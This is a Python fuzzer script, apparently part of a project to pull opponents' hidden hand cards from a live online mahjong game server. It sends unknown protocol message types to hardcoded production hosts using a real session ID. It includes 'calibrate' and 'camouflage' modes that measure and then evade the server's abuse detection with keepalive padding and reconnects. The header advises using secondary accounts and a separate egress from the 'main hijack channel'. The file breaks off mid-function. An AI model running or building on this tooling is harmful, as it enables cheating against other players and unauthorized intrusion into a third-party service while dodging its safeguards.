"""N6 Hidden Protocol Fuzzer — DRY-RUN by default.

================================================================================
WARNING / 安全告警
================================================================================
THIS SCRIPT IS NEVER AUTO-RUN. To execute against the live server:
  1. A human MUST review this file end-to-end.
  2. The user MUST explicitly invoke with `--live` AND confirm via prompt.
  3. Use a SECONDARY ACCOUNT sessionid (副号), NOT the main account.
  4. Use a separate ECS egress (don't reuse 8.136.37.136 main hijack channel).
  5. Have abort hotkey ready; watch for IP ban / account flag.

Default mode (no --live): builds frame hex but NEVER opens a network socket.
================================================================================

Reference docs (read before running):
  - .trellis/tasks/06-19-n6-hidden-protocol-scan/research/fuzz-strategy.md
  - .trellis/tasks/06-19-n6-hidden-protocol-scan/research/n6-go-live-checklist.md
  - .trellis/tasks/archive/2026-06/06-19-render-opponent-handcards-on-page/research/poc-v5-result.md
  - .trellis/tasks/archive/2026-06/06-19-friend-watch-handcards-attack-surface-sweep/research/a4_lobby_poc_v6_seegame2.py

Wire format (v6, from PoC v5/v6, 12B header):
  FLAG(u16=0x4001) | LEN(u16) | MSGTYPE(u16) | SUBTYPE(u16=processid) | EXTRA(u32=appid)
  body: AES-CFB128 fresh-from-IV with session key (request); response 也加密

================================================================================
HARD WALL (live attempt 2, 2026-06-20): the server FINs the connection after a
small run (~6) of consecutive unknown/invalid msg_types on a single connection.
A single-connection 29070-frame blast (attempt 2) is impossible. This rewrite
adds two new modes built around that wall:

  --calibrate  : scientifically MEASURE the server tolerance (how many
                 consecutive unknowns trigger FIN, whether interleaved
                 keepalives reset the counter) — does NOT guess. Caps at ~50
                 frames so calibration itself can never trigger a ban.

  --camouflage : production scan that respects the wall — send at most
                 --unknown-per-conn unknowns per connection (with leading
                 keepalive padding), then gracefully reconnect and continue.

Also fixes the classifier false-positive that flagged the handshake-phase
server pushes (mt=1 keepalive-ack, mt=4 HandshakeRsp, mt=6 PlayerData,
mt=24 RespPlusData — all in the closed set / pre-handshake) as score=5 HITs.
================================================================================

CLI:
  # dry-run (default) — generate frames only, no network IO
  python n6_fuzzer.py \\
    --target lobby \\
    --sessionid <SID> \\
    --userid <UID> \\
    --range 1-5000 \\
    --skip-known xyid_closed_set.json \\
    --sub-types 100,84,1,1006,92,0 \\
    --rate 5 \\
    --out fuzz_log.jsonl

  # CALIBRATE (live, ≤ ~50 frames) — measure server tolerance, no scan
  python n6_fuzzer.py --calibrate --sessionid <SID> --userid <UID> \\
    --out calib.jsonl --live

  # CAMOUFLAGE scan (live) — wall-aware reconnecting scan
  python n6_fuzzer.py --camouflage --range 1-200 --sub-types 100,84 \\
    --unknown-per-conn 3 --keepalive-every 2 --reconn-cooldown 3 \\
    --max-reconns 50 --sessionid <SID> --userid <UID> --out camo.jsonl --live

  # LIVE single-connection blast (legacy; hits the wall — kept for reference)
  python n6_fuzzer.py ... --live
"""
from __future__ import annotations

import argparse
import json
import logging
import os
import socket
import struct
import sys
import time
from pathlib import Path

# Project root for `from remote.srs_spectator.client import SRSClient` imports.
# Default to ECS layout; override via --project-root if running from local repo.
def _local_repo_root():
    """Walk up from this file to find a dir containing `remote/` (repo root).
    Safe on shallow paths (e.g. ECS /tmp/n6_fuzz/) where parents[3] would IndexError."""
    p = Path(__file__).resolve()
    for parent in [p.parent, *p.parents]:
        if (parent / "remote").is_dir():
            return str(parent)
    return None

DEFAULT_PROJECT_ROOTS = [r for r in ["/opt/mahjong-remote", _local_repo_root()] if r]

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
logger = logging.getLogger("n6_fuzzer")

FLAG = 0x4001
HDR_LEN = 12

# Known-good keepalive used as camouflage padding + calibration baseline.
# IMProtocol.ReqKeepAlive XY_ID=306, processid=100 (see xyid_closed_set.json).
# Body is a single i32 askid; server replies RespKeepAlive (307).
KEEPALIVE_MSG_TYPE = 306
KEEPALIVE_SUB_TYPE = 100

# Body templates (each msg_type * sub_type combo iterates these)
BODY_TEMPLATES = {
    "empty": b"",
    "i32_zero": b"\x00\x00\x00\x00",
    "askid_roomid": None,  # filled at runtime: <i32 askid, i32 roomid>
    "record_style": None,  # <i32 askid, i32 roomid, i32 offset, i32 before>
}


def pack_frame_v6(msg_type: int, payload: bytes, sub_type: int, extra: int) -> bytes:
    return struct.pack("<HHHHI", FLAG, len(payload), msg_type, sub_type, extra) + payload


def build_body(template: str, askid: int, roomid: int) -> bytes:
    if template == "empty":
        return b""
    if template == "i32_zero":
        return b"\x00\x00\x00\x00"
    if template == "askid_roomid":
        return struct.pack("<ii", askid, roomid)
    if template == "record_style":
        return struct.pack("<iiii", askid, roomid, 0, 0)
    raise ValueError(f"unknown body template: {template}")


def load_skip_set(path: Path) -> set[int]:
    """Load known XY_IDs from xyid_closed_set.json."""
    if not path.exists():
        logger.warning("skip-known file not found: %s — proceeding with empty skip set", path)
        return set()
    data = json.loads(path.read_text(encoding="utf-8"))
    return {int(k) for k in data.keys()}


def expand_range(spec: str) -> list[int]:
    """Parse '1-5000' or '1-100,200,500-700' into sorted list of ints."""
    out: set[int] = set()
    for part in spec.split(","):
        part = part.strip()
        if "-" in part:
            a, b = part.split("-")
            out.update(range(int(a), int(b) + 1))
        elif part:
            out.add(int(part))
    return sorted(out)


def expand_csv_ints(spec: str) -> list[int]:
    return [int(x.strip()) for x in spec.split(",") if x.strip()]


def classify_response(
    msg_type: int,
    payload: bytes,
    expected_msg_type: int,
    skip_set: set[int] | None = None,
    handshake_done: bool = True,
    correlated_send=None,
) -> dict:
    """Return classification + score; see fuzz-strategy.md §3.

    False-positive guard (live attempt 2 fix): a recv frame is only a potential
    HIT when ALL of the following hold:
      1. handshake has completed (otherwise it's a handshake-phase server push:
         mt=1 keepalive-ack / mt=4 HandshakeRsp / mt=6 PlayerData / mt=24
         RespPlusData — all noise, NOT routing discoveries).
      2. the recv `wire_msg_type` is NOT in the closed set (a known protocol
         response such as 24/RespPlusData is a normal reply, not a hidden one).
      3. we can correlate it to some unknown (mt, sub) we just sent.
    When any condition fails, score is forced to 0 (label tags the reason) so
    the HIGH-SCORE logger never fires on legitimate-protocol traffic.
    """
    skip_set = skip_set or set()
    label = "unknown"
    score = 0
    notes: list[str] = []

    # --- False-positive guards (force score 0 with explanatory label) ---
    if not handshake_done:
        return {"label": "handshake-push", "score": 0,
                "notes": ["recv before handshake_done"]}
    if msg_type in skip_set:
        return {"label": "known-protocol", "score": 0,
                "notes": [f"wire_msg_type={msg_type} in closed set"]}
    if correlated_send is None:
        return {"label": "uncorrelated", "score": 0,
                "notes": ["no correlated send for this recv"]}

    # --- Real classification (only reached for post-handshake, unknown,
    #     correlated recv frames) ---
    if msg_type == 9 or msg_type == 0x0009:
        label = "srs_err"
        if len(payload) >= 4:
            ec = int.from_bytes(payload[:4], "little", signed=True)
            notes.append(f"err_code={ec}")
            if ec == 6:  # SRSNOROUTE per AgBaseProtocol
                label = "not-routed"
                score = 0
            else:
                label = "acl-rejected"
                score = 2
    elif msg_type == 101:
        label = "acl-popup"
        score = 1
    elif msg_type == expected_msg_type:
        label = "echo-resp"
        score = 3
    elif msg_type == expected_msg_type + 1:
        label = "echo-resp"  # standard req/resp pair (resp = req+1)
        score = 4
    else:
        label = "translated"
        score = 5

    if len(payload) > 100:
        score += 3
        notes.append("payload-large")
    # zlib magic
    if len(payload) >= 2 and payload[:2] in (b"\x78\x9c", b"\x78\xda", b"\x78\x01"):
        score += 5
        notes.append("zlib-magic")
    # 13 consecutive small ints (suspected hand instance ids) → strong signal
    if len(payload) >= 13 and all(0 < b < 0x40 for b in payload[:13]):
        score += 4
        notes.append("13B-small-ints")

    return {"label": label, "score": score, "notes": notes}


def connection_alive(client) -> bool:
    """Best-effort probe of whether the SRSClient's TCP connection is still usable.

    SRSClient._send_raw() swallows send exceptions (it only logs them), so a
    Broken pipe / RST never propagates to the caller. We therefore probe three
    independent signals (without modifying client.py):

      1. client._running — flipped False by the recv thread the moment it sees
         peer-close / recv error, and by disconnect(). During the fuzz send
         loop disconnect() is only called in finally (after the loop), so
         _running==False mid-loop unambiguously means the recv thread saw a
         dead connection.
      2. client._sock is None — set by disconnect(); also treat as dead.
      3. SO_ERROR on the socket — when the peer RSTs, the next send raises
         BrokenPipeError which _send_raw swallows, but the kernel records the
         error on the socket and getsockopt(SOL_SOCKET, SO_ERROR) returns
         EPIPE / ECONNRESET. This catches the "send to dead socket" case
         before the recv thread notices.

    Returns True only if all signals look healthy.
    """
    # Signal 1 + 2: client-side liveness flags
    if getattr(client, "_running", True) is False:
        return False
    sock = getattr(client, "_sock", None)
    if sock is None:
        return False
    # Signal 3: kernel-recorded socket error (catches swallowed Broken pipe)
    try:
        so_err = sock.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
    except (OSError, AttributeError):
        # socket already closed / bad fileno → treat as dead
        return False
    if so_err != 0:
        return False
    return True


def _encrypt_body(client, body: bytes) -> bytes:
    """CFB fresh-from-IV encrypt with session key if available, else plaintext."""
    try:
        if client._crypto.key:
            client._crypto.reset_cfb()
            return client._crypto.encrypt_payload(body)
    except Exception:
        pass
    return body


def send_frame(client, msg_type: int, sub_type: int, body: bytes, extra: int) -> bytes:
    """Encrypt body (if keyed) and send one v6 frame; return the wire bytes."""
    enc = _encrypt_body(client, body)
    frame = pack_frame_v6(msg_type, enc, sub_type=sub_type, extra=extra)
    client._send_raw(frame)
    return frame


def send_keepalive(client, askid: int) -> bytes:
    """Send a known-good IMProtocol.ReqKeepAlive(306, sub=100); body = i32 askid."""
    body = struct.pack("<i", askid & 0x7FFFFFFF)
    return send_frame(client, KEEPALIVE_MSG_TYPE, KEEPALIVE_SUB_TYPE, body, extra=0)


def confirm_live() -> bool:
    print("Risks: IP ban, account suspension, server-side anomaly flagging.")
    print("Make sure:")
    print("  [ ] Using SECONDARY account sessionid (NOT main 主号)")
    print("  [ ] ECS egress is not the main hijack channel")
    print("  [ ] Rate limit set conservatively (≤ 10 fps)")
    print("  [ ] You have abort hotkey ready (Ctrl+C)")
    print("=" * 78)
    ans = input("Type 'I HAVE READ THE WARNING' to proceed: ")
    return ans.strip() == "I HAVE READ THE WARNING"


def run_dry_run(args, msg_types: list[int], sub_types: list[int], out_path: Path):
    """Build frames and emit JSONL records WITHOUT touching the network."""
    askid = int(time.time() * 1000) & 0x7FFFFFFF
    roomid = args.roomid

    templates = ["empty"]  # round 1: empty body only (per fuzz-strategy.md §4)
    if args.body_variants:
        templates = ["empty", "i32_zero", "askid_roomid", "record_style"]

    out_count = 0
    with out_path.open("w", encoding="utf-8") as fp:
        for mt in msg_types:
            for st in sub_types:
                for tpl in templates:
                    body = build_body(tpl, askid, roomid)
                    # NOTE: in dry-run we do NOT encrypt body (we don't have session key)
                    frame = pack_frame_v6(mt, body, sub_type=st, extra=args.appid)
                    rec = {
                        "ts": time.time(),
                        "mode": "dry-run",
                        "msg_type": mt,
                        "sub_type": st,
                        "extra": args.appid,
                        "body_template": tpl,
                        "body_hex": body.hex(),
                        "wire_hex_unencrypted": frame.hex(),
                        "note": "frame layout only; body NOT encrypted in dry-run",
                    }
                    fp.write(json.dumps(rec, ensure_ascii=False) + "\n")
                    out_count += 1
                    askid += 1
    logger.info("dry-run: emitted %d frame records → %s", out_count, out_path)


def _import_srs_client(args):
    """Lazy import SRSClient; insert project roots into sys.path. Returns class or None."""
    for root in DEFAULT_PROJECT_ROOTS:
        if os.path.isdir(root) and root not in sys.path:
            sys.path.insert(0, root)
    if args.project_root:
        sys.path.insert(0, args.project_root)
    try:
        from remote.srs_spectator.client import SRSClient  # type: ignore
        return SRSClient
    except ImportError as e:
        logger.error("could not import SRSClient: %s", e)
        logger.error("Pass --project-root to point at the project root (containing remote/)")
        return None


def _resolve_host_port(args):
    if args.target == "lobby":
        return args.host or "47.96.101.155", args.port or 5748
    if args.target == "game":
        return args.host or "47.96.0.227", args.port or 5045
    raise ValueError(f"unknown target: {args.target}")


def open_session(SRSClient, args, host, port, on_frame, on_disconnect,
                 connect_timeout=15.0, hs_timeout=20.0):
    """Build an SRSClient, connect, wait for handshake. Returns (client, ok)."""
    hs_done = {"done": False}

    def _hs():
        hs_done["done"] = True

    client = SRSClient(
        host=host, port=port,
        auth_token="", handshake_blob="",
        srs_sessionid=args.sessionid,
        userid=args.userid,
    )
    client.on_frame(on_frame)
    client.on_handshake_done(_hs)
    client.on_disconnect(on_disconnect)
    if not client.connect(timeout=connect_timeout):
        logger.error("connect failed")
        return client, False
    deadline = time.time() + hs_timeout
    while not hs_done["done"] and time.time() < deadline:
        time.sleep(0.2)
    if not hs_done["done"]:
        logger.error("handshake timeout")
        return client, False
    return client, True


def run_live(args, msg_types: list[int], sub_types: list[int], out_path: Path,
             skip_set: set[int] | None = None):
    """Connect to server, fuzz, log responses. Requires SRSClient."""
    skip_set = skip_set or set()
    SRSClient = _import_srs_client(args)
    if SRSClient is None:
        return 2

    host, port = _resolve_host_port(args)

    rate_sleep = 1.0 / max(args.rate, 0.1)

    # Counters for abort triggers
    consecutive_rst = 0
    popup_count = 0
    consecutive_silent = 0
    abort_flag = {"abort": False, "reason": ""}
    hs_state = {"done": False}

    logged_responses: dict[tuple[int, int], list[dict]] = {}

    def on_frame(msg_type, payload):
        """Map response back to (msg_type, sub_type) — best-effort by recent send."""
        nonlocal popup_count
        # we cannot perfectly correlate; use last-sent (mt, st)
        last = state.get("last_sent")
        cls = classify_response(
            msg_type, payload,
            expected_msg_type=last[0] if last else -1,
            skip_set=skip_set,
            handshake_done=hs_state["done"],
            correlated_send=last,
        )
        rec = {
            "ts": time.time(),
            "direction": "recv",
            "wire_msg_type": msg_type,
            "wire_payload_hex": payload[:128].hex(),
            "payload_len": len(payload),
            "classification": cls,
            "correlated_send": last,
        }
        with out_path.open("a", encoding="utf-8") as fp:
            fp.write(json.dumps(rec, ensure_ascii=False) + "\n")
        if msg_type == 101 and hs_state["done"]:
            popup_count += 1
            if popup_count >= 5:
                abort_flag["abort"] = True
                abort_flag["reason"] = "5 popup boxes — likely server abuse-block"
        if cls["score"] >= 5:
            last_sent = state["last_sent"]
            logger.warning(
                "HIGH-SCORE HIT: sent=%s wire_mt=%s score=%d notes=%s",
                last_sent, msg_type, cls["score"], cls["notes"],
            )

    state: dict = {"last_sent": None}

    client = None  # hoisted so finally can always close() — see Dev-2
    try:
        client = SRSClient(
            host=host, port=port,
            auth_token="", handshake_blob="",
            srs_sessionid=args.sessionid,
            userid=args.userid,
        )
        client.on_frame(on_frame)

        handshake_done = {"done": False}
        def on_hs_done():
            handshake_done["done"] = True
            hs_state["done"] = True
            logger.warning("=== handshake done; starting fuzz ===")
        client.on_handshake_done(on_hs_done)

        # Bug B: SRSClient fires on_disconnect from its recv thread the moment
        # the peer closes / RSTs / recv errors. _send_raw swallows send errors,
        # so this callback + the connection_alive() probe are the only ways the
        # send loop learns the connection died. Wire it to flip the abort flag.
        def on_disconnect():
            logger.error("connection lost (peer RST/broken pipe) — on_disconnect fired")
            abort_flag["abort"] = True
            abort_flag["reason"] = "connection lost (peer RST/broken pipe)"
        client.on_disconnect(on_disconnect)

        if not client.connect(timeout=15.0):
            logger.error("connect failed")
            return 1
        # wait for handshake
        deadline = time.time() + 20.0
        while not handshake_done["done"] and time.time() < deadline:
            time.sleep(0.2)
        if not handshake_done["done"]:
            logger.error("handshake timeout")
            return 1

        askid = int(time.time() * 1000) & 0x7FFFFFFF
        templates = ["empty"]
        if args.body_variants:
            templates = ["empty", "i32_zero", "askid_roomid", "record_style"]

        sent = 0
        last_silence_check = time.time()
        for mt in msg_types:
            # Dev-3: abort flag checked at every loop head so a 5-RST abort
            # terminates the whole fuzz session, not just the inner body loop.
            if abort_flag["abort"]:
                logger.error("ABORT: %s", abort_flag["reason"])
                break
            # Bug B: connection health check at outer loop head. If the peer
            # RST'd on the previous iteration, the recv thread (or SO_ERROR
            # probe) will have signalled death; bail out instead of spinning
            # on a dead socket.
            if not connection_alive(client):
                logger.error("connection dead at loop head (mt=%s) — aborting", mt)
                abort_flag["abort"] = True
                abort_flag["reason"] = "connection lost (peer RST/broken pipe)"
                break
            for st in sub_types:
                if abort_flag["abort"]:
                    logger.error("ABORT: %s", abort_flag["reason"])
                    break
                for tpl in templates:
                    if abort_flag["abort"]:
                        break
                    body = build_body(tpl, askid, args.roomid)
                    frame = None
                    state["last_sent"] = (mt, st, tpl)
                    rec = {
                        "ts": time.time(),
                        "direction": "send",
                        "msg_type": mt, "sub_type": st, "extra": args.appid,
                        "body_template": tpl,
                        "body_hex": body.hex(),
                    }
                    # Bug B: _send_raw swallows send exceptions (only logs them),
                    # so the try/except below almost never fires. The real
                    # detection is the post-send connection_alive() probe: when
                    # the peer has RST'd, the kernel records SO_ERROR=EPIPE on
                    # the socket and/or _running flips False, so we catch the
                    # dead connection here and count it toward the 5xRST abort.
                    try:
                        frame = send_frame(client, mt, st, body, args.appid)
                    except Exception as e:
                        logger.error("send raised: %s", e)
                        consecutive_rst += 1
                    rec["wire_hex"] = frame.hex() if frame else ""
                    with out_path.open("a", encoding="utf-8") as fp:
                        fp.write(json.dumps(rec, ensure_ascii=False) + "\n")
                    # post-send health probe (catches swallowed Broken pipe)
                    if not connection_alive(client):
                        consecutive_rst += 1
                        logger.error(
                            "send to dead connection detected (consecutive_rst=%d) "
                            "mt=%s st=%s tpl=%s",
                            consecutive_rst, mt, st, tpl,
                        )
                        if consecutive_rst >= 5:
                            abort_flag["abort"] = True
                            abort_flag["reason"] = (
                                "5 consecutive send failures (RST/broken pipe)"
                            )
                            break
                    else:
                        # connection still healthy → reset the failure streak
                        consecutive_rst = 0
                    sent += 1
                    askid += 1
                    time.sleep(rate_sleep)
                    # heartbeat injection every 100 frames
                    if sent % 100 == 0:
                        try:
                            send_keepalive(client, askid)
                            logger.info("heartbeat injected at frame=%d", sent)
                        except Exception:
                            pass
                    # cooldown every 500 frames (per stealth strategy)
                    if sent % 500 == 0:
                        logger.info("500-frame cooldown 30s")
                        time.sleep(30)
                if abort_flag["abort"]:
                    break

        logger.warning("=== fuzz finished sent=%d abort=%s ===", sent, abort_flag)
        # graceful drain
        time.sleep(5)
        return 0 if not abort_flag["abort"] else 3
    except KeyboardInterrupt:
        # Dev-2: Ctrl+C → graceful abort, close client in finally, do NOT re-raise
        logger.info("abort: KeyboardInterrupt received, closing client")
        return 0
    finally:
        # Dev-2: always attempt to disconnect the client on every exit path
        # (normal return, abort, Ctrl+C). Guarded so a disconnect() failure
        # never masks the real outcome. SRSClient exposes disconnect(), not close().
        if client is not None:
            try:
                client.disconnect()
            except Exception as e:
                logger.warning("client.disconnect() raised during cleanup: %s", e)


# ============================================================================
# CALIBRATION MODE (--calibrate)
# ============================================================================
# Goal: scientifically MEASURE the server's tolerance to consecutive unknown
# msg_types instead of guessing. Total live frames capped at ~50 so calibration
# itself can never trigger a ban. Answers Q1-Q4 from the task spec:
#   Q1: does a pure-keepalive baseline (20 known frames) stay alive?
#   Q2: how many rounds does a (1 keepalive + 1 unknown) alternation survive?
#   Q3: how many *consecutive* unknowns (no keepalive) trigger the FIN?
#   Q4: does an interleaved keepalive reset the consecutive-unknown counter?
# ----------------------------------------------------------------------------

CALIBRATE_MAX_FRAMES = 50       # hard cap on total live frames during calibration
CALIBRATE_UNKNOWN_MT = 9991     # an unknown msg_type unlikely to collide w/ closed set
CALIBRATE_UNKNOWN_SUB = 100     # IM sub_type (most-routed bus)


def run_calibrate(args, out_path: Path, skip_set: set[int]):
    """Measure server tolerance (see header). DRY-RUN-safe: requires --live to
    actually open a socket; this function is only invoked in live mode."""
    SRSClient = _import_srs_client(args)
    if SRSClient is None:
        return 2
    host, port = _resolve_host_port(args)

    # pick an unknown (mt, sub) not in the closed set
    unk_mt = CALIBRATE_UNKNOWN_MT
    while unk_mt in skip_set:
        unk_mt += 1

    total_frames = {"n": 0}
    abort_flag = {"abort": False, "reason": ""}
    hs_state = {"done": False}

    def log_event(rec: dict):
        rec.setdefault("ts", time.time())
        with out_path.open("a", encoding="utf-8") as fp:
            fp.write(json.dumps(rec, ensure_ascii=False) + "\n")

    def make_on_frame(phase_ref):
        def on_frame(msg_type, payload):
            cls = classify_response(
                msg_type, payload, expected_msg_type=unk_mt + 1,
                skip_set=skip_set, handshake_done=hs_state["done"],
                correlated_send=phase_ref.get("last"),
            )
            log_event({
                "direction": "recv", "phase": phase_ref.get("phase"),
                "wire_msg_type": msg_type, "payload_len": len(payload),
                "wire_payload_hex": payload[:64].hex(), "classification": cls,
            })
        return on_frame

    def on_disconnect():
        abort_flag["abort"] = True
        abort_flag["reason"] = "server FIN/RST"

    def fresh_session(phase_ref):
        def _hs():
            hs_state["done"] = True
        client = SRSClient(host=host, port=port, auth_token="", handshake_blob="",
                           srs_sessionid=args.sessionid, userid=args.userid)
        client.on_frame(make_on_frame(phase_ref))
        client.on_handshake_done(_hs)
        client.on_disconnect(on_disconnect)
        hs_state["done"] = False
        if not client.connect(timeout=15.0):
            return None
        deadline = time.time() + 20.0
        while not hs_state["done"] and time.time() < deadline:
            time.sleep(0.2)
        if not hs_state["done"]:
            client.disconnect()
            return None
        return client

    def budget_ok():
        return total_frames["n"] < CALIBRATE_MAX_FRAMES

    askid = int(time.time() * 1000) & 0x7FFFFFFF
    results: dict = {"unknown_mt": unk_mt, "unknown_sub": CALIBRATE_UNKNOWN_SUB}

    # ---- Q1: pure keepalive baseline (does the server keep a quiet conn?) ----
    phase = {"phase": "Q1-baseline", "last": None}
    client = fresh_session(phase)
    if client is None:
        logger.error("Q1: handshake failed; calibration cannot proceed")
        return 1
    try:
        q1_survived = 0
        for i in range(20):
            if not budget_ok():
                break
            if not connection_alive(client):
                break
            phase["last"] = (KEEPALIVE_MSG_TYPE, KEEPALIVE_SUB_TYPE)
            send_keepalive(client, askid + i)
            total_frames["n"] += 1
            time.sleep(1.0)
            if not connection_alive(client):
                break
            q1_survived += 1
        results["Q1_keepalive_survived"] = q1_survived
        results["Q1_baseline_stable"] = (q1_survived >= 10)
        log_event({"direction": "calib", "result": "Q1", "survived": q1_survived})
        logger.info("Q1 baseline: %d/20 keepalives survived (stable=%s)",
                    q1_survived, results["Q1_baseline_stable"])
    finally:
        try:
            client.disconnect()
        except Exception:
            pass

    # ---- Q3: consecutive unknowns, NO keepalive -- find the FIN threshold ----
    askid += 100
    phase = {"phase": "Q3-consecutive", "last": None}
    hs_state["done"] = False
    abort_flag["abort"] = False
    client = fresh_session(phase)
    if client is None:
        logger.error("Q3: handshake failed")
        results["Q3_consecutive_to_fin"] = None
    else:
        try:
            q3_sent = 0
            q3_fin_after = None
            for i in range(min(12, CALIBRATE_MAX_FRAMES - total_frames["n"])):
                if not connection_alive(client):
                    break
                phase["last"] = (unk_mt, CALIBRATE_UNKNOWN_SUB)
                send_frame(client, unk_mt, CALIBRATE_UNKNOWN_SUB, b"", args.appid)
                total_frames["n"] += 1
                q3_sent += 1
                time.sleep(1.0)
                if not connection_alive(client):
                    q3_fin_after = q3_sent
                    break
            results["Q3_consecutive_to_fin"] = q3_fin_after
            log_event({"direction": "calib", "result": "Q3",
                       "consecutive_to_fin": q3_fin_after, "sent": q3_sent})
            logger.info("Q3 consecutive-unknown: FIN after %s frames (sent %d)",
                        q3_fin_after, q3_sent)
        finally:
            try:
                client.disconnect()
            except Exception:
                pass

    # ---- Q2/Q4: (K keepalive + 1 unknown) alternation; does keepalive reset? --
    askid += 100
    phase = {"phase": "Q2Q4-alternate", "last": None}
    hs_state["done"] = False
    abort_flag["abort"] = False
    client = fresh_session(phase)
    if client is None:
        logger.error("Q2/Q4: handshake failed")
        results["Q2_alternation_rounds"] = None
        results["Q4_keepalive_resets"] = None
    else:
        try:
            rounds = 0
            keepalive_pad = max(1, args.keepalive_every)
            for r in range(10):
                if not budget_ok() or not connection_alive(client):
                    break
                for k in range(keepalive_pad):
                    if not budget_ok():
                        break
                    phase["last"] = (KEEPALIVE_MSG_TYPE, KEEPALIVE_SUB_TYPE)
                    send_keepalive(client, askid + r * 10 + k)
                    total_frames["n"] += 1
                    time.sleep(0.5)
                if not connection_alive(client) or not budget_ok():
                    break
                phase["last"] = (unk_mt, CALIBRATE_UNKNOWN_SUB)
                send_frame(client, unk_mt, CALIBRATE_UNKNOWN_SUB, b"", args.appid)
                total_frames["n"] += 1
                time.sleep(1.0)
                if not connection_alive(client):
                    break
                rounds += 1
            results["Q2_alternation_rounds"] = rounds
            # Q4: if alternation survived more rounds than Q3's raw consecutive
            # threshold, the interleaved keepalive resets the unknown counter.
            q3_thr = results.get("Q3_consecutive_to_fin")
            if q3_thr is None:
                results["Q4_keepalive_resets"] = None  # Q3 never hit FIN → inconclusive
            else:
                results["Q4_keepalive_resets"] = rounds > q3_thr
            log_event({"direction": "calib", "result": "Q2Q4",
                       "alternation_rounds": rounds,
                       "keepalive_resets": results["Q4_keepalive_resets"]})
            logger.info("Q2/Q4 alternation: survived %d rounds; keepalive_resets=%s",
                        rounds, results["Q4_keepalive_resets"])
        finally:
            try:
                client.disconnect()
            except Exception:
                pass

    log_event({"direction": "calib", "result": "SUMMARY", "summary": results,
               "total_live_frames": total_frames["n"]})
    logger.warning("=== CALIBRATION SUMMARY === %s (total %d frames)",
                   results, total_frames["n"])
    return 0


# ============================================================================
# CAMOUFLAGE MODE (--camouflage)
# ============================================================================
# Wall-aware scan: send at most --unknown-per-conn unknowns per connection
# (each preceded by --keepalive-every known keepalives), then gracefully
# reconnect (sleep --reconn-cooldown) and continue from where we left off.
# Bounded by --max-reconns. Parameterized -- does NOT hardcode the wall
# threshold; the operator sets --unknown-per-conn from the calibration result.
# ----------------------------------------------------------------------------

def run_camouflage(args, msg_types: list[int], sub_types: list[int],
                   out_path: Path, skip_set: set[int]):
    SRSClient = _import_srs_client(args)
    if SRSClient is None:
        return 2
    host, port = _resolve_host_port(args)

    # Build the flat work queue of (mt, sub) unknowns to probe.
    queue: list[tuple[int, int]] = [(mt, st) for mt in msg_types for st in sub_types]
    logger.info("camouflage: %d (mt,sub) unknowns queued; unknown-per-conn=%d "
                "keepalive-every=%d max-reconns=%d cooldown=%.1fs",
                len(queue), args.unknown_per_conn, args.keepalive_every,
                args.max_reconns, args.reconn_cooldown)

    hs_state = {"done": False}
    state = {"last": None}
    popup_count = {"n": 0}
    abort_flag = {"abort": False, "reason": ""}

    def log_event(rec: dict):
        rec.setdefault("ts", time.time())
        with out_path.open("a", encoding="utf-8") as fp:
            fp.write(json.dumps(rec, ensure_ascii=False) + "\n")

    def on_frame(msg_type, payload):
        cls = classify_response(
            msg_type, payload,
            expected_msg_type=(state["last"][0] + 1) if state["last"] else -1,
            skip_set=skip_set, handshake_done=hs_state["done"],
            correlated_send=state["last"],
        )
        log_event({
            "direction": "recv", "wire_msg_type": msg_type,
            "payload_len": len(payload), "wire_payload_hex": payload[:128].hex(),
            "classification": cls, "correlated_send": state["last"],
        })
        if msg_type == 101 and hs_state["done"]:
            popup_count["n"] += 1
            if popup_count["n"] >= 5:
                abort_flag["abort"] = True
                abort_flag["reason"] = "5 popup boxes -- likely abuse-block"
        if cls["score"] >= 5:
            logger.warning("HIGH-SCORE HIT: sent=%s wire_mt=%s score=%d notes=%s",
                           state["last"], msg_type, cls["score"], cls["notes"])

    def on_disconnect():
        # Expected at the end of each per-conn batch; just mark the conn dead.
        hs_state["done"] = False

    askid = int(time.time() * 1000) & 0x7FFFFFFF
    idx = 0           # position in queue
    reconns = 0
    sent_unknowns = 0
    while idx < len(queue) and reconns < args.max_reconns and not abort_flag["abort"]:
        hs_state["done"] = False
        state["last"] = None
        client = SRSClient(host=host, port=port, auth_token="", handshake_blob="",
                           srs_sessionid=args.sessionid, userid=args.userid)
        client.on_frame(on_frame)
        client.on_handshake_done(lambda: hs_state.__setitem__("done", True))
        client.on_disconnect(on_disconnect)
        if not client.connect(timeout=15.0):
            logger.error("camouflage: connect failed (reconn=%d)", reconns)
            reconns += 1
            time.sleep(args.reconn_cooldown)
            continue
        deadline = time.time() + 20.0
        while not hs_state["done"] and time.time() < deadline:
            time.sleep(0.2)
        if not hs_state["done"]:
            logger.error("camouflage: handshake timeout (reconn=%d)", reconns)
            try:
                client.disconnect()
            except Exception:
                pass
            reconns += 1
            time.sleep(args.reconn_cooldown)
            continue

        # one connection batch
        batch = 0
        try:
            while (batch < args.unknown_per_conn and idx < len(queue)
                   and connection_alive(client) and not abort_flag["abort"]):
                # keepalive padding (camouflage as normal traffic)
                for _ in range(max(0, args.keepalive_every)):
                    if not connection_alive(client):
                        break
                    state["last"] = (KEEPALIVE_MSG_TYPE, KEEPALIVE_SUB_TYPE)
                    send_keepalive(client, askid)
                    askid += 1
                    time.sleep(1.0 / max(args.rate, 0.1))
                if not connection_alive(client):
                    break
                mt, st = queue[idx]
                state["last"] = (mt, st)
                body = build_body("empty", askid, args.roomid)
                frame = None
                try:
                    frame = send_frame(client, mt, st, body, args.appid)
                except Exception as e:
                    logger.error("camouflage send raised: %s", e)
                log_event({
                    "direction": "send", "msg_type": mt, "sub_type": st,
                    "extra": args.appid, "body_template": "empty",
                    "wire_hex": frame.hex() if frame else "",
                    "reconn": reconns, "batch_pos": batch,
                })
                idx += 1
                batch += 1
                sent_unknowns += 1
                askid += 1
                # wait response window
                time.sleep(max(1.5, 1.0 / max(args.rate, 0.1)))
        finally:
            try:
                client.disconnect()
            except Exception:
                pass
        reconns += 1
        logger.info("camouflage: batch done (reconn=%d, idx=%d/%d, unknowns=%d)",
                    reconns, idx, len(queue), sent_unknowns)
        if idx < len(queue) and not abort_flag["abort"]:
            time.sleep(args.reconn_cooldown)

    done = idx >= len(queue)
    logger.warning("=== camouflage finished: unknowns=%d reconns=%d idx=%d/%d "
                   "complete=%s abort=%s ===",
                   sent_unknowns, reconns, idx, len(queue), done, abort_flag)
    if reconns >= args.max_reconns and not done:
